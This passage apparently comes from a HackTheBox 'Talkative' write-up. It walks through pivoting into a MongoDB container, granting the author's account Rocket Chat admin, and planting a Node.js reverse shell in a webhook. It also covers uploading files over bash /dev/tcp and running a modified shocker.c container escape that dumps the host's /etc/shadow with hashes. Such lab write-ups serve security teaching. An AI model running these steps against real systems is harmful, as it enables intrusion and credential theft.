root        3115  0.0  0.0 1075112  592 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6013 -container-ip 172.17.0.17 -container-port 80
root        3223  0.0  0.0 1222576  420 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6014 -container-ip 172.17.0.18 -container-port 80
root        3338  0.0  0.0 1150252  388 ?        Sl   15:21   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6015 -container-ip 172.17.0.19 -container-port 80
saul        8245  0.0  0.0   6432   656 pts/0    S+   19:59   0:00 grep --color=auto docker

```
- 172.18.0.2 is the jamovi container that I’ve already had a shell in.
- 172.17.0.3 is getting port 3000, so that’s likely the Rocket Chat instance.
- 172.17.0.4-19 are each getting a forward from a listening on 172.17.0.1, which is this host. This is a technique that HTB employs sometimes to keep players from spoiling and/or breaking the box for other players. I suspect it’s running 16 copies of the main Bolt website, and then using the player’s IP address and IP tables to load balance across those. That allows me to mess with or even completely take down Bolt without messing up other players.

Interestingly, there is a 172.17.0.2, it’s just not having any ports forwarded to it:

```

saul@talkative:~$ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.060 ms
--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.060/0.060/0.060/0.000 ms

```

#### 172.17.0.2

I’ll host a [statically compiled](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) `nmap` on my webserver and upload it to Talkative:

```

saul@talkative:/dev/shm$ wget 10.10.14.6/nmap
--2022-08-22 20:15:21--  http://10.10.14.6/nmap
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944464 (5.7M) [application/octet-stream]
Saving to: ‘nmap’

nmap                100%[===================>]   5.67M  6.41MB/s    in 0.9s    

2022-08-22 20:15:22 (6.41 MB/s) - ‘nmap’ saved [5944464/5944464]

saul@talkative:/dev/shm$ chmod +x nmap

```

Running with the default top 1000 ports finds nothing:

```

saul@talkative:/dev/shm$ ./nmap 172.17.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 20:15 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.2
Host is up (0.00013s latency).
All 1182 scanned ports on 172.17.0.2 are closed

Nmap done: 1 IP address (1 host up) scanned in 12.46 seconds

```

Running again with all ports finds a single port:

```

saul@talkative:/dev/shm$ ./nmap 172.17.0.2 --min-rate 10000 -p-

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 20:15 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.2
Host is up (0.00011s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
27017/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds

```

27017 is [commonly used for](https://www.speedguide.net/port.php?port=27017) MongoDB.

### Rocket Chat Admin

#### Tunnel

The tools to connect to Mongo are not installed on Talkative. I’ll upload [Chisel](https://github.com/jpillora/chisel) and create a tunnel. After hosting it on my webserver, I’ll fetch it:

```

saul@talkative:/dev/shm$ wget 10.10.14.6/chisel_1.7.7_linux_amd64
--2022-08-22 20:18:43--  http://10.10.14.6/chisel_1.7.7_linux_amd64
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8077312 (7.7M) [application/octet-stream]
Saving to: ‘chisel_1.7.7_linux_amd64’

chisel_1.7.7_linux_ 100%[===================>]   7.70M  7.43MB/s    in 1.0s    

2022-08-22 20:18:44 (7.43 MB/s) - ‘chisel_1.7.7_linux_amd64’ saved [8077312/8077312]

saul@talkative:/dev/shm$ chmod +x ./chisel_1.7.7_linux_amd64 

```

I’ll start `chisel` as a server on my host:

```

oxdf@hacky$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p 8000 --reverse
2022/08/22 20:20:10 server: Reverse tunnelling enabled
2022/08/22 20:20:10 server: Fingerprint lBroorqb8hNJ1apYMV0NtLd7Urs/x5mHOi9mmaT0ckY=
2022/08/22 20:20:10 server: Listening on http://0.0.0.0:8000

```

I’ll use port 8000 since Burp is using the default of 8080. I’ll also give the `--reverse` flag to say that I want clients to be able to open ports on my host.

Now I’ll connect from talkative:

```

saul@talkative:/dev/shm$ ./chisel_1.7.7_linux_amd64 client 10.10.14.6:8000 R:27017:172.17.0.2:27017 
2022/08/22 20:21:51 client: Connecting to ws://10.10.14.6:8000
2022/08/22 20:21:52 client: Connected (Latency 86.206267ms)

```

The server reports success:

```

2022/08/22 20:21:51 server: session#1: tun: proxy#R:27017=>172.17.0.2:27017: Listening

```

#### Enumerate DB

I’ll connect with `mongo` (`apt install mongodb-clients`):

```

oxdf@hacky$ mongo
MongoDB shell version v3.6.8
connecting to: mongodb://127.0.0.1:27017
Implicit session: session { "id" : UUID("08a04e87-1918-430a-b27e-8e4f9462a6bc") }
MongoDB server version: 4.0.26
WARNING: shell and server versions do not match
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
Server has startup warnings: 
2022-08-22T15:21:10.531+0000 I STORAGE  [initandlisten] 
2022-08-22T15:21:10.531+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2022-08-22T15:21:10.531+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2022-08-22T15:21:12.944+0000 I CONTROL  [initandlisten] 
2022-08-22T15:21:12.944+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2022-08-22T15:21:12.944+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2022-08-22T15:21:12.944+0000 I CONTROL  [initandlisten] 
rs0:PRIMARY>

```

By default it will use localhost port 27017, which is my Chisel listening port, so it works. It doesn’t seem to need creds.

There are four DBs:

```

rs0:PRIMARY> show databases
admin   0.000GB
config  0.000GB
local   0.011GB
meteor  0.005GB

```

`admin`, `config`, and `local` are default databases that Mongo installs. I’ll use `meteor`:

```

rs0:PRIMARY> use meteor
switched to db meteor

```

There are 59 of Collections (like tables), most of which start with `rocketchat_`:

```

rs0:PRIMARY> db.getCollectionNames()
[
        "_raix_push_app_tokens",
        "_raix_push_notifications",
        "instances",
        "meteor_accounts_loginServiceConfiguration",
        "meteor_oauth_pendingCredentials",
        "meteor_oauth_pendingRequestTokens",
        "migrations",
        "rocketchat__trash",
        "rocketchat_apps",
...[snip]...
        "rocketchat_webdav_accounts",
        "system.views",
        "ufsTokens",
        "users",
        "usersSessions",
        "view_livechat_queue_status"
]

```

The `users` collection is always an interesting place to start:

```

rs0:PRIMARY> db.users.find()
{ "_id" : "rocket.cat", "createdAt" : ISODate("2021-08-10T19:44:00.224Z"), "avatarOrigin" : "local", "name" : "Rocket.Cat", "username" : "rocket.cat", "status" : "online", "statusDefault" : "online", "utcOffset" : 0, "active" : true, "type" : "bot", "_updatedAt" : ISODate("2021-08-10T19:44:00.615Z"), "roles" : [ "bot" ] }
{ "_id" : "ZLMid6a4h5YEosPQi", "createdAt" : ISODate("2021-08-10T19:49:48.673Z"), "services" : { "password" : { "bcrypt" : "$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y" }, "email" : { "verificationTokens" : [ { "token" : "dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w", "address" : "saul@talkative.htb", "when" : ISODate("2021-08-10T19:49:48.738Z") } ] }, "resume" : { "loginTokens" : [ ] } }, "emails" : [ { "address" : "saul@talkative.htb", "verified" : false } ], "type" : "user", "status" : "offline", "active" : true, "_updatedAt" : ISODate("2022-08-22T15:31:50.632Z"), "roles" : [ "admin" ], "name" : "Saul Goodman", "lastLogin" : ISODate("2022-03-15T17:06:56.543Z"), "statusConnection" : "offline", "username" : "admin", "utcOffset" : 0 }
{ "_id" : "D2ze5944wkr99XKoj", "createdAt" : ISODate("2022-08-22T16:50:27.387Z"), "services" : { "password" : { "bcrypt" : "$2b$10$kbN/AhN042QGxORsTAFcv.Wbo/wtukjjz141Ec4DqHpzTwopr60sy", "reset" : { "token" : "0nZNNqxuDJpWLWwIwkwQuZArIjxuUjZ3JyxQP8ziSTk", "email" : "0xdf@talkative.htb", "when" : ISODate("2022-08-22T16:50:32.790Z"), "reason" : "enroll" } }, "email" : { "verificationTokens" : [ { "token" : "kT9lIZrgJT2_a9-WUe955FA1Ty4KUUp1osP-FWEQrWF", "address" : "0xdf@talkative.htb", "when" : ISODate("2022-08-22T16:50:27.473Z") } ] }, "resume" : { "loginTokens" : [ { "when" : ISODate("2022-08-22T20:30:15.872Z"), "hashedToken" : "KuQPV+DNYyaY8cVEPfGNn0hUEzBWpp0WJSNUhblNQMg=" } ] } }, "emails" : [ { "address" : "0xdf@talkative.htb", "verified" : false } ], "type" : "user", "status" : "online", "active" : true, "_updatedAt" : ISODate("2022-08-22T20:30:15.923Z"), "roles" : [ "user" ], "name" : "0xdf", "lastLogin" : ISODate("2022-08-22T20:30:15.868Z"), "statusConnection" : "online", "utcOffset" : 0, "username" : "0xdf" }

```

There’s Rocket.Cat, which is a default bot user. I’ll clean up the JSON for the other two users:

```

{
  "_id" : "ZLMid6a4h5YEosPQi", 
  "createdAt" : ISODate("2021-08-10T19:49:48.673Z"), 
  "services" : { 
    "password" : { 
      "bcrypt" : "$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y"
    }, 
    "email" : { 
      "verificationTokens" : [
        {
          "token" : "dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w", 
          "address" : "saul@talkative.htb", 
          "when" : ISODate("2021-08-10T19:49:48.738Z") 
        } 
      ] 
    }, 
    "resume" : { 
      "loginTokens" : [ ] 
    }
  }, 
  "emails" : [ 
    { 
      "address" : "saul@talkative.htb",
      "verified" : false 
    } 
  ], 
  "type" : "user", 
  "status" : "offline", 
  "active" : true, 
  "_updatedAt" : ISODate("2022-08-22T15:31:50.632Z"), 
  "roles" : [ "admin" ], 
  "name" : "Saul Goodman", 
  "lastLogin" : ISODate("2022-03-15T17:06:56.543Z"), 
  "statusConnection" : "offline", 
  "username" : "admin", 
  "utcOffset" : 0 
}
{
  "_id" : "D2ze5944wkr99XKoj", 
  "createdAt" : ISODate("2022-08-22T16:50:27.387Z"), 
  "services" : { 
    "password" : { 
      "bcrypt" : "$2b$10$kbN/AhN042QGxORsTAFcv.Wbo/wtukjjz141Ec4DqHpzTwopr60sy",
      "reset" : { 
        "token" : "0nZNNqxuDJpWLWwIwkwQuZArIjxuUjZ3JyxQP8ziSTk", 
        "email" : "0xdf@talkative.htb", 
        "when" : ISODate("2022-08-22T16:50:32.790Z"), 
        "reason" : "enroll" 
      } 
    }, 
    "email" : { 
      "verificationTokens" : [
        { 
          "token" : "kT9lIZrgJT2_a9-WUe955FA1Ty4KUUp1osP-FWEQrWF",
          "address" : "0xdf@talkative.htb",
          "when" : ISODate("2022-08-22T16:50:27.473Z")
        }
      ]
    }, 
    "resume" : { 
      "loginTokens" : [
        { 
          "when" : ISODate("2022-08-22T20:30:15.872Z"), 
          "hashedToken" : "KuQPV+DNYyaY8cVEPfGNn0hUEzBWpp0WJSNUhblNQMg=" 
        }
      ] 
    }
  }, 
  "emails" : [
    { 
      "address" : "0xdf@talkative.htb", 
      "verified" : false 
    } 
  ], 
  "type" : "user",
  "status" : "online",
  "active" : true, 
  "_updatedAt" : ISODate("2022-08-22T20:30:15.923Z"), 
  "roles" : [ "user" ], 
  "name" : "0xdf", 
  "lastLogin" : ISODate("2022-08-22T20:30:15.868Z"), 
  "statusConnection" : "online", 
  "utcOffset" : 0, 
  "username" : "0xdf"
}

```

There’s a good bit of JSON there, but the big difference between our accounts is the `roles` field, where I have “user”, and saul has “admin”.

#### Add Admin

I’ll use Mongo to give my account the admin role:

```

rs0:PRIMARY> db.users.update({"_id": "D2ze5944wkr99XKoj"}, { $set: { "roles" : ["admin"]}})
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

```

`db.users.update` is calling the `update` method on the `users` collection. This takes two parameters. The first identifies which objects are to be updated. In this case, I’ll use the `_id` for my user to make sure it just changes me. The second is what and how to modify. The `$set` [operator](https://www.mongodb.com/docs/manual/reference/operator/update/set/) replaces the value of a field with the given value. Then I pass it the `roles` field, and set it to `["admin"]` to match saul.

Now on refreshing `/admin`, there’s a lot more there than [before](#identify-cred-validity):

[![image-20220822164603124](https://0xdfimages.gitlab.io/img/image-20220822164603124.png)](https://0xdfimages.gitlab.io/img/image-20220822164603124.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220822164603124.png)

### WebHook Integration

#### Identify

There’s a ton of information / options in this admin panel. One that jumps out pretty quickly is “Integrations” > “New Integration”:

![image-20220822165344215](https://0xdfimages.gitlab.io/img/image-20220822165344215.png)

An Incoming WebHook will listening for HTTP requests and post some messages based on the content of the request. An Outgoing WebHook will process chat messages in Rocket Chat and send HTTP data when certain criteria are met.

According to the [docs](https://docs.rocket.chat/guides/administration/admin-panel/integrations), both use ES2015 / ECMAScript 6 ([basically JavaScript](https://codeburst.io/javascript-wtf-is-es6-es8-es-2017-ecmascript-dca859e4821c)) to process the data, look for triggers, and generate the next step.

#### Rev Shell

I’ll need a JavaScript reverse shell to run. [revshells.com](https://www.revshells.com/) has one that works ok, “node.js#2”:

![image-20220822170454608](https://0xdfimages.gitlab.io/img/image-20220822170454608.png)

The challenge that this shell runs into is that `require` may not be available in the given context. There’s a line I can add at the top that brings it in:

```

const require = console.log.constructor('return process.mainModule.require')();

```

#### Generate WebHook

The form to create a WebHook is long. I’ll start with naming it and pointing it at the `#general` channel:

![image-20220822170710367](https://0xdfimages.gitlab.io/img/image-20220822170710367.png)

Skipping over a bunch of optional fields, I’ll reach the “Script” field:

![image-20220822170844536](https://0xdfimages.gitlab.io/img/image-20220822170844536.png)

I’ll save the WebHook, and it shows up on the Integrations page:

![image-20220822170917897](https://0xdfimages.gitlab.io/img/image-20220822170917897.png)

Going back into it, now below the script is the “WebHook URL”

![image-20220822170950529](https://0xdfimages.gitlab.io/img/image-20220822170950529.png)

This is how I trigger the webhook.

If there are errors in my JavaScript syntax, it will tell you on revisiting this page as well.

#### Shell

With `nc` listening, I’ll use `curl` to trigger the WebHook:

```

oxdf@hacky$ curl http://talkative.htb:3000/hooks/DipzE7grNCHMg2ty4/9YNLS4NfMsRihzAP5yLoqqz98amQvACcuot3sAyfSumt2GqW
{"success":false}

```

It reports failure, but there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 445
Listening on 0.0.0.0 445
Connection received on 10.10.11.155 42576

```

It’s a shell:

```

id
uid=0(root) gid=0(root) groups=0(root)

```

Upgrade with [the script trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

script /dev/null -c bash
Script started, file is /dev/null
root@c150397ccd63:/app/bundle/programs/server# ^Z
[1]+  Stopped                 nc -lnvp 445
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 445
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@c150397ccd63:/app/bundle/programs/server# 

```

## Shell as root on Talkative

### File Upload

#### Initial Enumeration

Again, I have a shell in a Docker container that is relatively empty. `/root` has nothing of interest, and there are no folders in `/home`.

This container also has very limited tools. No `nc`, `wget`, `curl`, which removes many of the standard ways I would upload files to a box.

The box does have `node`, `perl`, and `bash`, each of which would provide ways to upload. I’ll show `bash` since that’s what I like best, and it’s most common to find in this scenario.

#### bash Upload

[This gist](https://gist.github.com/jadell/871512) gives a clean and simple way to write to and from a socket using just bash.

To show this, I’ll start `nc` listening on 9001 on my host. From Talkative, I’ll run `exec 3<>/dev/tcp/10.10.14.6/9001`, which returns without any message. At `nc`, it’s connected:

```

oxdf@hacky$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.155 60860

```

At this point, I’ve created a file descriptor (3), and have both in and out for it redirecting to `/dev/tcp/10.10.14.6/9001`. So reading and writing to 3 will read and write to this special file, which will represents a TCP socket between Talkative and my host. For this to work, the socket has to open, so it has, and that’s the “Connection received” message.

I can write to the descriptor / socket with something like `echo "test!" >&3`, and it comes out on my host:

```

Connection received on 10.10.11.155 60860
test!

```

If I run `cat <&3`, then it will hang, waiting for input from the socket. Because `nc` was run without any input, I can go into that window and type a message:

```

Connection received on 10.10.11.155 60860
test!
Hello from hacky!

```

And it’s sent back to Talkative:

```

root@c150397ccd63:/dev/shm# cat <&3
Hello from hacky!

```

To get a file up, I’ll kill the `nc` window and re-run it like this:

```

oxdf@hacky$ md5sum deepce.sh 
fbbbd13e42ed84c07f8fde52ac035706  deepce.sh
oxdf@hacky$ cat deepce.sh | nc -lnvp 9001
Listening on 0.0.0.0 9001

```

Now I’ll do the same thing, but this time save it to a file:

```

root@c150397ccd63:/dev/shm# exec 3<>/dev/tcp/10.10.14.6/9001
root@c150397ccd63:/dev/shm# cat <&3 > deepce.sh             
^C
root@c150397ccd63:/dev/shm# md5sum deepce.sh 
fbbbd13e42ed84c07f8fde52ac035706  deepce.sh

```

There’s no end to the socket, so I’ll have to Ctrl-c it after a few seconds. The hashes match, so I’m good there.

### deepce

#### Initial Run

I’ll upload [deepce](https://github.com/stealthcopter/deepce) is a neat tool for looking for basic Docker vulnerabilities. It hasn’t been significantly updated in a couple years, but it still does a good job of identifying many classes of vulnerability. It’s a pure `sh` script with very few dependencies, so it is likely to run on the most stripped down containers.

I’ll upload it to the container using the method shown above, and give it a run:

```

root@c150397ccd63:/dev/shm# bash deepce.sh 

                      ##         .
                ## ## ##        ==
             ## ## ## ##       ===
         /"""""""""""""""""\___/ ===
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/
           \    \         __/
            \____\_______/
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See https://stealthcopter.github.io/deepce

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
ls: cannot access '/app/docker.sock': No such file or directory
[+] Sock is writable ........ No
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ c150397ccd63
[+] Container Full ID ....... c150397ccd634de99b32847ec1df1342c8a8107f002bb12ec7460ae6aa93e726
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.17.0.3 
[+] DNS Server(s) ........... 1.1.1.1 
[+] Host IP ................. 172.17.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 5.4.0-81-generic
[+] Arch .................... x86_64
[+] CPU ..................... AMD EPYC 7302P 16-Core Processor
[+] Useful tools installed .. Yes
/bin/hostname
[+] Dangerous Capabilities .. Unknown (capsh not installed)
[+] SSHD Service ............ Unknown (ps not installed)
[+] Privileged Mode ......... No
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. No
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... No
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... No
[+] Hashes in shadow file ............... No permissions
[+] Searching for app dirs .............. 
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further

TODO Enumerate container using sock
==============================================================================================

```

The colors don’t come through here, but there are two bits that fail due to missing binaries:

![image-20220823124918679](https://0xdfimages.gitlab.io/img/image-20220823124918679.png)

#### Install Dependencies

The OS for this container is Debian 10 (buster):

```

root@c150397ccd63:/dev/shm# cat /etc/os-release 
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

```

Some Googling gets me to the [Debian man page for capsh](https://manpages.debian.org/buster/libcap2-bin/capsh.1.en.html). At the top right, it has the version for buster (1:2.25-2) and a link (“package tracker”) to find the packages:

![image-20220823131131560](https://0xdfimages.gitlab.io/img/image-20220823131131560.png)

On the [tracker page](https://tracker.debian.org/pkg/libcap2), I’ll see the link to the version I’m looking for under “oldstable”:

![image-20220823131224863](https://0xdfimages.gitlab.io/img/image-20220823131224863.png)

That leads to the page for `libcap2`. The link to `libcap2-bin` is what has the command line executables, so I’ll click that next. On that page, it shows that `libcap2` is a dependency:

![image-20220823131538568](https://0xdfimages.gitlab.io/img/image-20220823131538568.png)

I’ll download the amd64 `.deb` files for both `libcap2` and `libcap2-bin`:

```

oxdf@hacky$ wget http://http.us.debian.org/debian/pool/main/libc/libcap2/libcap2_2.25-2_amd64.deb
--2022-08-23 17:18:40--  http://http.us.debian.org/debian/pool/main/libc/libcap2/libcap2_2.25-2_amd64.deb
Resolving http.us.debian.org (http.us.debian.org)... 2600:3404:200:237::2, 2600:3402:200:227::2, 2620:0:861:2:208:80:154:139, ...
Connecting to http.us.debian.org (http.us.debian.org)|2600:3404:200:237::2|:80... failed: Network is unreachable.
Connecting to http.us.debian.org (http.us.debian.org)|2600:3402:200:227::2|:80... failed: Network is unreachable.
Connecting to http.us.debian.org (http.us.debian.org)|2620:0:861:2:208:80:154:139|:80... failed: Network is unreachable.
Connecting to http.us.debian.org (http.us.debian.org)|64.50.233.100|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17572 (17K)
Saving to: ‘libcap2_2.25-2_amd64.deb’

libcap2_2.25-2_amd64.deb                             100%[=====================================================================================================================>]  17.16K  --.-KB/s    in 0.02s   

2022-08-23 17:18:40 (1.09 MB/s) - ‘libcap2_2.25-2_amd64.deb’ saved [17572/17572]

oxdf@hacky$ wget http://http.us.debian.org/debian/pool/main/libc/libcap2/libcap2-bin_2.25-2_amd64.deb
--2022-08-23 17:18:54--  http://http.us.debian.org/debian/pool/main/libc/libcap2/libcap2-bin_2.25-2_amd64.deb
Resolving http.us.debian.org (http.us.debian.org)... 2600:3402:200:227::2, 2620:0:861:2:208:80:154:139, 2600:3404:200:237::2, ...
Connecting to http.us.debian.org (http.us.debian.org)|2600:3402:200:227::2|:80... failed: Network is unreachable.
Connecting to http.us.debian.org (http.us.debian.org)|2620:0:861:2:208:80:154:139|:80... failed: Network is unreachable.
Connecting to http.us.debian.org (http.us.debian.org)|2600:3404:200:237::2|:80... failed: Network is unreachable.
Connecting to http.us.debian.org (http.us.debian.org)|64.50.233.100|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28820 (28K)
Saving to: ‘libcap2-bin_2.25-2_amd64.deb’

libcap2-bin_2.25-2_amd64.deb                         100%[=====================================================================================================================>]  28.14K  --.-KB/s    in 0.02s   

2022-08-23 17:18:55 (1.66 MB/s) - ‘libcap2-bin_2.25-2_amd64.deb’ saved [28820/28820]

```

I’ll upload both files just like above, making sure to verify the hashes match on both sides.

Now as root I can just install with `dpkg`:

```

root@c150397ccd63:/dev/shm# dpkg -i libcap2_2.25-2_amd64.deb 
Selecting previously unselected package libcap2:amd64.
(Reading database ... 6684 files and directories currently installed.)
Preparing to unpack libcap2_2.25-2_amd64.deb ...
Unpacking libcap2:amd64 (1:2.25-2) ...
Setting up libcap2:amd64 (1:2.25-2) ...
Processing triggers for libc-bin (2.28-10) ...
root@c150397ccd63:/etc# dpkg -i libcap2-bin_2.25-2_amd64.deb 
Selecting previously unselected package libcap2-bin.
(Reading database ... 6690 files and directories currently installed.)
Preparing to unpack libcap2-bin_2.25-2_amd64.deb ...
Unpacking libcap2-bin (1:2.25-2) ...
Setting up libcap2-bin (1:2.25-2) ...

```

#### deepce.sh Again

This time, when I run it, there’s information under “Dangerous Capabilities”:

[![image-20220823132402657](https://0xdfimages.gitlab.io/img/image-20220823132402657.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220823132402657.png)

`cap_dac_read_search` is highlighted in red.

### shocker

#### Background

[This blog post](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) from 2014 shows how to abuse this capability using a program posted to OpenWall named `shocker.c`. This program abuses the `cap_dac_read_search` capability to read files from the host system.

#### POC

I’ll download a copy of the original script [here](http://stealth.openwall.net/xSports/shocker.c). I’ll need to make one change. The binary needs to open a file that’s on the host and mounted into the container. `mount` will show the mounts:

```

root@c150397ccd63:~# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/SJ7L7M7IXKP2LYEKIS4QTXWMB2:/var/lib/docker/overlay2/l/V56NO5353KGHEUPU2G64UYICZS:/var/lib/docker/overlay2/l/57PYNL7JWAUZ2ZEF5CM7JKTH2Y:/
var/lib/docker/overlay2/l/K4DCIUMHCNYT3RFVQSR7KCCWLJ:/var/lib/docker/overlay2/l/LLNI6XKILGAYVK3VSFPKZQC4NI,upperdir=/var/lib/docker/overlay2/5de14f4c9bdeaf0f8a19d03adcc2d28ccc97655bb5bc5f888490c184d2ad70dc/diff,
workdir=/var/lib/docker/overlay2/5de14f4c9bdeaf0f8a19d03adcc2d28ccc97655bb5bc5f888490c184d2ad70dc/work,xino=off)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
...[snip]...
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/mapper/ubuntu--vg-ubuntu--lv on /app/uploads type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/resolv.conf type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hostname type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hosts type ext4 (rw,relatime)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
...[snip]...

```

I’ll use `/etc/hosts`, updating line 166:

```

        // get a FS reference from something mounted in from outside
        if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
                die("[-] open");

```

Now I’ll compile that with `gcc` and upload it to Talkative. If I didn’t update the file to one that exists (the default it `/.dockerinit` which isn’t in this container), it’ll error out:

```

root@c150397ccd63:~# ./so
[***] docker VMM-container breakout Po(C) 2014             [***]                  
[***] The tea from the 90's kicks your sekurity again.     [***]                    
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]                      

<enter>
                                                                                                         
[-] open: No such file or directory 

```

But the updated version dumps `/etc/shadow` from the host:

```

root@c150397ccd63:~# ./so
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

<enter>

[*] Resolving 'etc/shadow'
[*] Found lib32
[*] Found ..
[*] Found lost+found
[*] Found sbin
[*] Found bin
[*] Found boot
[*] Found dev
[*] Found run
[*] Found lib64
[*] Found .
[*] Found var
[*] Found home
[*] Found media
[*] Found proc
[*] Found etc
[+] Match: etc ino=393217
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'shadow'
[*] Found modules-load.d
[*] Found lsb-release
[*] Found rsyslog.conf
[*] Found rc6.d
[*] Found calendar
[*] Found fstab
[*] Found shadow
[+] Match: shadow ino=393228
[*] Brute forcing remaining 32bit. This can take a while...
[*] (shadow) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x0c, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x0c, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:
root:$6$9GrOpvcijuCP93rg$tkcyh.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::
daemon:*:18659:0:99999:7:::
...[snip]...
